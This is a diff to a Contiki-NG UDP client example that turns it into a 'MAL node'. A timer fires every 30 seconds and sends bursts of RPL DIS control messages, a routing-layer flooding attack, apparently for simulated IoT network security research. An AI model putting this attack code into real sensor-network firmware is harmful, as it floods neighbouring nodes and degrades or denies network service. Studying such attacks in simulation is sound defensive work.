@@ -1,11 +1,14 @@
 #include "contiki.h"
 #include "net/routing/routing.h"
+#include "net/routing/rpl-lite/rpl.h"
+
 #include "random.h"
 #include "net/netstack.h"
 #include "net/ipv6/simple-udp.h"
 
 #include "sys/log.h"
-#define LOG_MODULE "App"
+
+#define LOG_MODULE "MAL"
 #define LOG_LEVEL LOG_LEVEL_INFO
 
 #define WITH_SERVER_REPLY  1
@@ -15,9 +18,11 @@
 #define SEND_INTERVAL		  (60 * CLOCK_SECOND)
 
 static struct simple_udp_connection udp_conn;
+static void rpl_attack();
+ static struct ctimer mytime;
 
 /*---------------------------------------------------------------------------*/
-PROCESS(udp_client_process, "UDP client");
+PROCESS(udp_client_process, "MAL node");
 AUTOSTART_PROCESSES(&udp_client_process);
 /*---------------------------------------------------------------------------*/
 static void
@@ -38,10 +43,21 @@ udp_rx_callback(struct simple_udp_connection *c,
   LOG_INFO_("\n");
 
 }
+
+static void rpl_attack(void *ptr){
+  int i=0;
+      //My code
+      while (i<10){
+        i++;
+        rpl_icmp6_dis_output(NULL);
+      }
+  ctimer_reset(&mytime);
+}
 /*---------------------------------------------------------------------------*/
 PROCESS_THREAD(udp_client_process, ev, data)
 {
   static struct etimer periodic_timer;
+ 
   static unsigned count;
   static char str[32];
   uip_ipaddr_t dest_ipaddr;
@@ -53,10 +69,11 @@ PROCESS_THREAD(udp_client_process, ev, data)
                       UDP_SERVER_PORT, udp_rx_callback);
 
   etimer_set(&periodic_timer, random_rand() % SEND_INTERVAL);
+  ctimer_set(&mytime,30*CLOCK_SECOND,rpl_attack,NULL);
   while(1) {
     
     PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));
-
+    
     if(NETSTACK_ROUTING.node_is_reachable() && NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {
       /* Send to DAG root */
       LOG_INFO("Sending request %u to ", count);
